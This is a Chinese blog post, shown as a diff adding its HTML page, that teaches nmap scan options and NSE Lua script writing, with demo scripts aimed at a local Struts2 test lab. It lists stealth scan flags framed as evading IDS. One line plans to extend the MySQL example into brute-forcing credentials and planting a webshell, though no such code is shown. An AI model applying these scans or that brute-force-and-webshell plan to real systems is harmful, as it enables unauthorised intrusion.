@@ -1,0 +1,1013 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css">
+
+
+  <meta name="keywords" content="tools,">
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/images/111.png?v=5.1.1">
+
+
+
+
+
+
+<meta name="description" content="狐狸说：“对我来说，你只是一个小男孩，就像其他成千上万个小男孩一样没有什么两样。我不需要你。你也不需要我。对你来说，我也只是一只狐狸，和其他成千上万的狐狸没有什么不同。但是，如果你驯养了我，我们就会彼此需要。对我来说，你就是我的世界里独一无二的了；我对你来说，也是你的世界里的唯一了。”                                  —–安东尼·德·圣-埃克苏佩里《小王子》">
+<meta name="keywords" content="tools">
+<meta property="og:type" content="article">
+<meta property="og:title" content="nmap脚本编写初探">
+<meta property="og:url" content="http://yoursite.com/2018/04/27/nmap脚本编写初探/index.html">
+<meta property="og:site_name" content="Yokeen&#39;s blog">
+<meta property="og:description" content="狐狸说：“对我来说，你只是一个小男孩，就像其他成千上万个小男孩一样没有什么两样。我不需要你。你也不需要我。对你来说，我也只是一只狐狸，和其他成千上万的狐狸没有什么不同。但是，如果你驯养了我，我们就会彼此需要。对我来说，你就是我的世界里独一无二的了；我对你来说，也是你的世界里的唯一了。”                                  —–安东尼·德·圣-埃克苏佩里《小王子》">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://oxrfjovwk.bkt.clouddn.com/18-4-28/23571104.jpg">
+<meta property="og:image" content="http://oxrfjovwk.bkt.clouddn.com/18-4-28/65567780.jpg">
+<meta property="og:image" content="http://oxrfjovwk.bkt.clouddn.com/18-4-29/5881912.jpg">
+<meta property="og:image" content="http://oxrfjovwk.bkt.clouddn.com/18-5-1/87236907.jpg">
+<meta property="og:image" content="http://oxrfjovwk.bkt.clouddn.com/18-5-1/86600973.jpg">
+<meta property="og:image" content="http://oxrfjovwk.bkt.clouddn.com/18-4-29/97508517.jpg">
+<meta property="og:image" content="http://oxrfjovwk.bkt.clouddn.com/18-4-30/73702454.jpg">
+<meta property="og:image" content="http://oxrfjovwk.bkt.clouddn.com/18-4-30/60303356.jpg">
+<meta property="og:image" content="http://oxrfjovwk.bkt.clouddn.com/18-4-30/15620489.jpg">
+<meta property="og:image" content="http://oxrfjovwk.bkt.clouddn.com/18-4-30/86321816.jpg">
+<meta property="og:image" content="http://oxrfjovwk.bkt.clouddn.com/18-4-30/55543946.jpg">
+<meta property="og:image" content="http://oxrfjovwk.bkt.clouddn.com/18-4-30/27524239.jpg">
+<meta property="og:image" content="http://oxrfjovwk.bkt.clouddn.com/18-4-30/75770946.jpg">
+<meta property="og:image" content="http://oxrfjovwk.bkt.clouddn.com/18-4-30/68830742.jpg">
+<meta property="og:image" content="http://oxrfjovwk.bkt.clouddn.com/18-4-30/45331251.jpg">
+<meta property="og:image" content="http://oxrfjovwk.bkt.clouddn.com/18-4-30/63099934.jpg">
+<meta property="og:image" content="http://oxrfjovwk.bkt.clouddn.com/18-4-30/57164989.jpg">
+<meta property="og:image" content="http://oxrfjovwk.bkt.clouddn.com/18-5-1/64602657.jpg">
+<meta property="og:image" content="http://oxrfjovwk.bkt.clouddn.com/18-5-1/40692060.jpg">
+<meta property="og:image" content="http://oxrfjovwk.bkt.clouddn.com/18-5-1/11943554.jpg">
+<meta property="og:image" content="http://oxrfjovwk.bkt.clouddn.com/18-5-1/36001179.jpg">
+<meta property="og:image" content="http://oxrfjovwk.bkt.clouddn.com/18-5-1/34859016.jpg">
+<meta property="og:image" content="http://oxrfjovwk.bkt.clouddn.com/18-5-1/58934858.jpg">
+<meta property="og:image" content="http://oxrfjovwk.bkt.clouddn.com/18-5-1/59080616.jpg">
+<meta property="og:image" content="http://oxrfjovwk.bkt.clouddn.com/18-5-1/94825149.jpg">
+<meta property="og:image" content="http://oxrfjovwk.bkt.clouddn.com/18-5-1/62328954.jpg">
+<meta property="og:updated_time" content="2018-05-02T13:38:43.817Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="nmap脚本编写初探">
+<meta name="twitter:description" content="狐狸说：“对我来说，你只是一个小男孩，就像其他成千上万个小男孩一样没有什么两样。我不需要你。你也不需要我。对你来说，我也只是一只狐狸，和其他成千上万的狐狸没有什么不同。但是，如果你驯养了我，我们就会彼此需要。对我来说，你就是我的世界里独一无二的了；我对你来说，也是你的世界里的唯一了。”                                  —–安东尼·德·圣-埃克苏佩里《小王子》">
+<meta name="twitter:image" content="http://oxrfjovwk.bkt.clouddn.com/18-4-28/23571104.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"always","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: 'undefined',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: "",
+      labels: ""
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/04/27/nmap脚本编写初探/">
+
+
+
+
+
+  <title>nmap脚本编写初探 | Yokeen's blog</title>
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?12246f7e36b6d790ccbbfabf73da926b";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Yokeen's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope="" itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/27/nmap脚本编写初探/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Yokeen">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/beiy.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Yokeen's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">nmap脚本编写初探</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-27T20:56:28+08:00">
+                2018-04-27
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018/04/27/nmap脚本编写初探/" class="leancloud_visitors" data-flag-title="nmap脚本编写初探">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <hr>
+<p>狐狸说：“对我来说，你只是一个小男孩，就像其他成千上万个小男孩一样没有什么两样。我不需要你。你也不需要我。对你来说，我也只是一只狐狸，和其他成千上万的狐狸没有什么不同。但是，如果你驯养了我，我们就会彼此需要。对我来说，你就是我的世界里独一无二的了；我对你来说，也是你的世界里的唯一了。”<br>                                  —–安东尼·德·圣-埃克苏佩里《小王子》</p>
+<hr>
+<a id="more"></a>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>先是优化一下博客，把以前在在线平台上学习的基础小知识总结到一篇文章里边。</p>
+<p>二来就学习如何进行nmap脚本的编写(还是得拥有自己比较核心的东西，来提高效率)，同时也再回顾一下nmap的使用。</p>
+<h1 id="NMAP的使用"><a href="#NMAP的使用" class="headerlink" title="NMAP的使用"></a>NMAP的使用</h1><h2 id="NMAP端口状态"><a href="#NMAP端口状态" class="headerlink" title="NMAP端口状态"></a>NMAP端口状态</h2><p>Open(开放的): 应用程序正在这个端口上监听连接。<br>losed(关闭的): 端口对探测做出了响应，但是现在没有应用程序在监听这个端口。<br>Filtered(过滤的): 端口没有对探测做出响应。同时告诉我们探针可能被一些过滤器（防火墙）终止了。<br>Unfiltered(未被过滤的):端口对探测做出了响应，但是Nmap无法确定它们是关闭还是开放。<br>Open/Filtered: 端口被过滤或者是开放的，Nmap无法做出判断。<br>Closed/Filtered: 端口被过滤或者是关闭的，Nmap无法做出判断。</p>
+<h2 id="TCP标志位"><a href="#TCP标志位" class="headerlink" title="TCP标志位"></a>TCP标志位</h2><p>SYN(synchronous建立联机)<br>ACK(acknowledgement 确认)<br>PSH(push传送)<br>FIN(finish结束)<br>RST(reset重置)<br>URG(urgent紧急)</p>
+<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><p>nmap -pxx,xx target         //扫描目的的指定端口<br>nmap -iL    文件    //指定一个文本内的所有主机<br>nmap -iR number     //通过指定数量来随机选择互联网主机进行扫描<br>nmap 192.168.1.1-100 –exclude 192.168.1.20     //从扫描中排除一些主机<br>nmap -A target        //综合扫描（系统探测，版本探测，路由追踪以及一些常用脚本的扫描）<br>nmap -F target        //快速扫描，只扫描在nmap-services文件中的端口<br>nmap -O target        //探测操作系统信息<br>nmap -T&lt;0~5&gt;        //指定激烈扫描程度（5适合局域网）<br>nmap -PN            //不用默认的ping扫描，而是对目标进行完整的端口扫描，对探测有防火墙或者封锁了ping的主机有帮助<br>nmap -PS             //TCP SYN扫描<br>nmap -PA            //TCP ACK扫描</p>
+<p>nmap -sT             //TCP connect()默认的扫描方式，完成三次握手<br>nmap -sU             //用来探测目的的UDP端口，不需要发送任何的SYN包，发送UDP数据包到目的主机等待响应。<br>nmap -sP               //只用ping扫描来探测哪个目标是可达的，需要root权限，如果没有root权限会调用connect()<br>nmap -sS            //使用频率最高的半开放扫描<br>nmap -sn             //只ping扫描主机，不探测端口</p>
+<p>nmap -sF             //目标主机可能有IDS和IPS的存在，防火墙会阻止掉SYN数据包，发送一个FIN标志的数据包不需要完成TCP握手，也不会在目标产生日志。<br>nmap -sX            //XMAS扫描，发送FIN/PSH和URG标志的数据包。<br>nmap -sN              //空扫描。</p>
+<p>nmap -sV            //版本检测，探测目标主机和端口上运行的软件版本。</p>
+<p>nmap的输出：oN，oX，oS，oG（结果为一般模式。XML，kiddi3，grepable格式）</p>
+<p><strong>nmap输出 ip：port  格式：</strong><br>nmap -vv -p 80 192.168.1.0/24 | grep “Discovered open port” | awk {‘print $6”:”$4’} | awk -F/ {‘print $1’} &gt; output.txt</p>
+<h1 id="NSE-Script分析"><a href="#NSE-Script分析" class="headerlink" title="NSE Script分析"></a>NSE Script分析</h1><h2 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h2><p>Linux：<br><img src="http://oxrfjovwk.bkt.clouddn.com/18-4-28/23571104.jpg" alt=""><br>Windows：<br><img src="http://oxrfjovwk.bkt.clouddn.com/18-4-28/65567780.jpg" alt=""></p>
+<p><strong>主要关注两个目录：neslib和scripts</strong><br>neslib存放着各种库文件<br>script存放着NSE脚本<br><img src="http://oxrfjovwk.bkt.clouddn.com/18-4-29/5881912.jpg" alt=""><br>通过–script来指定要使用的脚本。<a href="https://nmap.org/nsedoc/" target="_blank" rel="noopener">nmap脚本和库文件手册</a></p>
+<p>其他一些文件比如nmap-services，存放着一些指纹信息，收录了互联网上基本上所有的端口所对应的服务。</p>
+<h2 id="lua语言基础"><a href="#lua语言基础" class="headerlink" title="lua语言基础"></a>lua语言基础</h2><p><a href="http://www.runoob.com/lua/lua-tutorial.html" target="_blank" rel="noopener">菜鸟教程-Lua</a></p>
+<h2 id="NSE脚本基本格式"><a href="#NSE脚本基本格式" class="headerlink" title="NSE脚本基本格式"></a>NSE脚本基本格式</h2><p><strong><font color="red">一个完整的NSE脚本通常都有这么几个部分的代码字段：</font></strong><br><strong>1、description：</strong><br>脚本的描述。<br><strong>2、catagories：</strong><br>脚本的分类。nmap除了可以指定单个脚本，还能够指定一类脚本，比如default，如果没有使用–script时，默认会加载这类脚本。<br><a href="https://nmap.org/nsedoc/categories/default.html" target="_blank" rel="noopener">NSE 脚本类别</a><br><img src="http://oxrfjovwk.bkt.clouddn.com/18-5-1/87236907.jpg" alt=""></p>
+<p><strong>3、rule：</strong><br>脚本的触发规则（一般是一个lua函数，返回值只有true和false），触发脚本执行的条件会在rule字段中定义。</p>
+<p><strong>4、action：</strong><br>脚本具体执行内容。rule触发规则为真时执行action定义的函数。</p>
+<p><a href="https://nmap.org/book/nse-script-format.html" target="_blank" rel="noopener">NSE脚本各字段描述</a></p>
+<h3 id="NSE脚本中的rule"><a href="#NSE脚本中的rule" class="headerlink" title="NSE脚本中的rule"></a>NSE脚本中的rule</h3><p>Nmap使用的规则是一个lua函数，用来决定是否执行脚本的action，会返回true或者false。如果返回值为true的话会执行脚本的action函数。</p>
+<p>用来决定规则真假的通常是基于规则的类型以及传递给它的主机和端口的信息。</p>
+<p><strong><font color="red">NSE脚本的执行顺序是和NMAP的扫描相结合，执行的先后顺序有以下四种：</font></strong><br><strong>prerule()：</strong><br>不接收参数，脚本只运行一次，在主机发现之前，发生在预扫描阶段。返回的值永远为真。<br><strong>hostrule(host)：</strong><br>设定参数为目标的ip地址或主机名，nmap完成了主机发现之后再运行脚本。<br><strong>portrule(host,port)：</strong><br>设定参数需要主机以及端口。在所有主机被扫描完成之后运行，每个端口运行一次，处于open，open|filtered，或者unfiltered状态的所有端口。<br><strong>postrule()：</strong><br>不接收参数，nmap完成所有主机已经被扫描后，在脚本的后扫描阶段。返回的值永远为真。</p>
+<p><strong>官网对NMAP rules中的介绍：</strong></p>
+<blockquote>
+<p>hostrule和portrule运行在被主机被扫描完成之后。hostrule和portrule对应函数返回true时，都会执行一次action函数。<br>当前对于prerule和postrule之间选择的标准是这样：如果脚本在做主机发现或者其他的网络操作那就应该使用prerule。<br>postrule是为了保存在扫描期间的数据报告和统计。</p>
+</blockquote>
+<p><strong><font color="red">规则执行的优先级分析：</font></strong><br><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">prerule = <span class="function"><span class="keyword">function</span><span class="params">()</span></span></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">"prerule"</span>)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">hostrule = <span class="function"><span class="keyword">function</span><span class="params">(host)</span></span></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">"hostrule"</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">portrule = <span class="function"><span class="keyword">function</span><span class="params">(host,port)</span></span></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">"portrule"</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">postrule = <span class="function"><span class="keyword">function</span><span class="params">()</span></span></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">"postrule"</span>)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">action = <span class="function"><span class="keyword">function</span><span class="params">(host)</span></span></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">"action is move!"</span>)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="http://oxrfjovwk.bkt.clouddn.com/18-5-1/86600973.jpg" alt=""><br>从这里就可以很清楚的看出规则所执行的优先级。</p>
+<p><strong>通过一个小脚本来学习NSE脚本的基本运行流程</strong><br><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> shortport = <span class="built_in">require</span> <span class="string">"shortport"</span></span><br><span class="line">description = <span class="string">[[a demo nse file]]</span></span><br><span class="line">categories = &#123;<span class="string">"default"</span>&#125;</span><br><span class="line"></span><br><span class="line">portrule = <span class="function"><span class="keyword">function</span><span class="params">( host, port )</span></span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">action = <span class="function"><span class="keyword">function</span><span class="params">(host, port)</span></span></span><br><span class="line">	<span class="keyword">return</span> <span class="string">"This is test"</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p>
+<p>代码中引入了一个nselib中的shortport库，<a href="https://nmap.org/nsedoc/lib/" target="_blank" rel="noopener">官网中对各种nmap库文件的介绍</a><br><img src="http://oxrfjovwk.bkt.clouddn.com/18-4-29/97508517.jpg" alt=""><br><img src="http://oxrfjovwk.bkt.clouddn.com/18-4-30/73702454.jpg" alt=""></p>
+<blockquote>
+<p>规则编写：如果端口协议为tcp并且端口号为30081(docker测试环境的struts2漏洞页面)并且为打开状态，则输出 This is Webserver<br><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> shortport = <span class="built_in">require</span> <span class="string">"shortport"</span></span><br><span class="line">description = <span class="string">[[a demo nse file]]</span></span><br><span class="line">categories = &#123;<span class="string">"default"</span>&#125;</span><br><span class="line"></span><br><span class="line">portrule = <span class="function"><span class="keyword">function</span><span class="params">(host,port)</span></span></span><br><span class="line">    <span class="keyword">return</span> port.protocol == <span class="string">"tcp"</span> <span class="keyword">and</span> port.number == <span class="number">30081</span>  <span class="keyword">and</span> port.state ==<span class="string">"open"</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">action = <span class="function"><span class="keyword">function</span><span class="params">(host, port)</span></span></span><br><span class="line">	<span class="keyword">return</span> <span class="string">"This is Webserver"</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<p>将代码保存在scripts目录中，执行nmap –script-updatedb更新脚本库，然后来进行扫描。可以加-d选项来进行debug。<br><img src="http://oxrfjovwk.bkt.clouddn.com/18-4-30/60303356.jpg" alt=""><br><img src="http://oxrfjovwk.bkt.clouddn.com/18-4-30/15620489.jpg" alt=""></p>
+<p>在原文代码中加入了端口对应的服务为http，这里没有识别出服务就去掉了，加个或逻辑也可以。</p>
+<p><a href="https://nmap.org/book/nse-script-format.html#nse-format-license" target="_blank" rel="noopener">NSE脚本中的Rules</a><br><a href="https://nmap.org/book/nse-script-format.html" target="_blank" rel="noopener">NSE脚本格式</a></p>
+<h3 id="NES脚本中的API"><a href="#NES脚本中的API" class="headerlink" title="NES脚本中的API"></a>NES脚本中的API</h3><p><strong><a href="https://nmap.org/book/nse-api.html" target="_blank" rel="noopener">nse-api</a></strong></p>
+<p>在上边portrule中，调用了扫描结果的API，比如端口对应的协议以及其状态。</p>
+<p><strong>nmap中API的核心功能就是向脚本提供主机和端口的信息。</strong><br><strong><font color="red">两个lua table类型的参数：host table 、 port table</font></strong></p>
+<p><strong>一、host table</strong></p>
+<ol>
+<li>host.os<br>获取nmap扫描到的操作系统的信息。（供应商，所属系列，型号，设备类型，CPE）</li>
+<li>host.ip<br>目标主机的IP地址</li>
+<li>host.name<br>返回目标主机的DNS反向解析的结果，如果没有的话返回空。</li>
+<li>host.mac_addr_src<br>被用来向目的主机发包的网卡的MAC地址。</li>
+</ol>
+<p>相应的还有host.interface、host.bin_ip等等等等<br><img src="http://oxrfjovwk.bkt.clouddn.com/18-4-30/86321816.jpg" alt=""></p>
+<p><strong>二、port table</strong></p>
+<ol>
+<li>port.number<br>目的端口的端口号</li>
+<li>port.protocol<br>目的端口的所使用的协议，有效的值为tcp和udp</li>
+<li>port.state<br>目的端口的状态<br><img src="http://oxrfjovwk.bkt.clouddn.com/18-4-30/55543946.jpg" alt=""></li>
+</ol>
+<h2 id="NSE中的库文件"><a href="#NSE中的库文件" class="headerlink" title="NSE中的库文件"></a>NSE中的库文件</h2><p>NSE中的库文件实现了代码的分离和重构，有助于脚本的开发，其存放在nselib文件夹中。</p>
+<h3 id="库文件的编写"><a href="#库文件的编写" class="headerlink" title="库文件的编写"></a>库文件的编写</h3><p>创建一个库文件保存为demo.lua，用于对于传入的参数 返回 这个端口 是开启的。<br><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Test</span><span class="params">( port )</span></span></span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">string</span>.<span class="built_in">format</span>(<span class="string">"The port '%s' is open"</span>,port)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p>
+<p>在脚本文件中引入这个库文件，引入库文件的格式一般为<br><strong>local 库文件名 = require “库文件名”</strong><br>业界人士称，在lua中，如果是一些经常用到的全局函数，可以申明为local局部变量，这样做可以提升效率。</p>
+<p>在脚本中使用此库文件中的函数。<br><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> shortport = <span class="built_in">require</span> <span class="string">"shortport"</span></span><br><span class="line"><span class="keyword">local</span> demo = <span class="built_in">require</span> <span class="string">"demo"</span></span><br><span class="line">description = <span class="string">[[neslib demo test]]</span></span><br><span class="line">categories = &#123;<span class="string">"default"</span>&#125;</span><br><span class="line"></span><br><span class="line">portrule = <span class="function"><span class="keyword">function</span><span class="params">(host,port)</span></span></span><br><span class="line">    <span class="keyword">return</span> port.protocol == <span class="string">"tcp"</span> <span class="keyword">and</span> port.number == <span class="number">30081</span>  <span class="keyword">and</span> port.state ==<span class="string">"open"</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">action = <span class="function"><span class="keyword">function</span><span class="params">(host, port)</span></span></span><br><span class="line">	<span class="keyword">return</span> Test(port.number)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="http://oxrfjovwk.bkt.clouddn.com/18-4-30/27524239.jpg" alt=""></p>
+<h1 id="NSE-Script编写"><a href="#NSE-Script编写" class="headerlink" title="NSE Script编写"></a>NSE Script编写</h1><h2 id="利用自有库和自定义库实现MySQL写库"><a href="#利用自有库和自定义库实现MySQL写库" class="headerlink" title="利用自有库和自定义库实现MySQL写库"></a>利用自有库和自定义库实现MySQL写库</h2><p>样例是先创建好数据库与表，然后使用库文件连接MySQL在表中写入数据。</p>
+<blockquote>
+<p>先学习学习用法，然后再拓展一下。<br>做一些改动，对其进行爆破之后自动创建一个数据库与表向里边写入数据。<br>后续如果是自动化的话，先进行爆破，成功后寻找Web路径，向Web路径写入木马。</p>
+</blockquote>
+<p><strong>需要用到的库：</strong></p>
+<blockquote>
+<ul>
+<li><a href="https://nmap.org/nsedoc/lib/mysql.html" target="_blank" rel="noopener">mysql</a>：用来进行数据库操作。</li>
+<li>nmap：通过nmap建立socket连接mysql。</li>
+<li>shortport：基本的port规则库。</li>
+<li>serializelib：自定义库，将table数据转换为字符串。</li>
+</ul>
+</blockquote>
+<p>serializelib 是将自己写的table数据转换为字符串，可以将host.os等数据转换为字符串写到数据库中，<a href="https://gitee.com/RE13ORN/my_nmap/blob/master/serializelib.lua" target="_blank" rel="noopener">下载地址</a></p>
+<p><strong>创建数据库和存放结果的表：</strong><br>create database nmap;<br>CREATE TABLE IF NOT EXISTS nmap.scanData (date varchar(40),hostos varchar(200),hostname varchar(100), ip varchar(16), port integer(5), protocol varchar(3), state varchar(20), service varchar(100), version varchar(100));</p>
+<p><strong>编写建立MySQL连接的NSE脚本</strong><br>样例代码中使用了mysql库中的三个函数：<br>loginRequest、receiveGreeting、sqlQuery<br><img src="http://oxrfjovwk.bkt.clouddn.com/18-4-30/75770946.jpg" alt=""><br><img src="http://oxrfjovwk.bkt.clouddn.com/18-4-30/68830742.jpg" alt=""><br><strong>receiveGreeting：</strong><br>1、所需参数是已经建立与远程服务器建立好了的socket连接。<br>2、返回两个值，第一个值返回true or false来判断是否成功接收。第二个值来返回跟多的细节，如果成功登录返回版本状态以及盐等，失败的话返回错误信息。<br><strong>loginRequest</strong><br>需要五个参数：<br>1、已经与远程服务器建立好了的socket连接<br>2、额外的一些参数，比如字符集以及所支持的认证方法。格式为字典。<br>3、用户名<br>4、密码<br>5、receiveGreeting所返回的盐。<br>返回两个值：<br>1、状态的布尔值<br>2、响应字段或者是连接失败的错误信息。<br><strong>sqlQuery</strong><br>需要两个参数：<br>1、已经与远程服务器建立好了的socket连接<br>2、执行的sql语句<br>返回两个值：<br>1、状态的布尔值<br>2、一些原始信息，可以被decodeDataPackets进行解码。</p>
+<p>在对函数介绍中所说，发送语句给mysql服务器，然后尝试对其响应进行解码，也就是说必须要有返回的第二个值，要交给decodeDataPackets进行解码，通过实际操作可以得知select是有返回值，但是insert没有返回值。<br><img src="http://oxrfjovwk.bkt.clouddn.com/18-4-30/45331251.jpg" alt=""><br><strong><font color="green">所以sqlQuery执行insert会报错，因为decodeDataPackets没有接收到参数。原文作者的解决方法是在insert语句后加一条 select 1；让其有返回值即可。</font></strong></p>
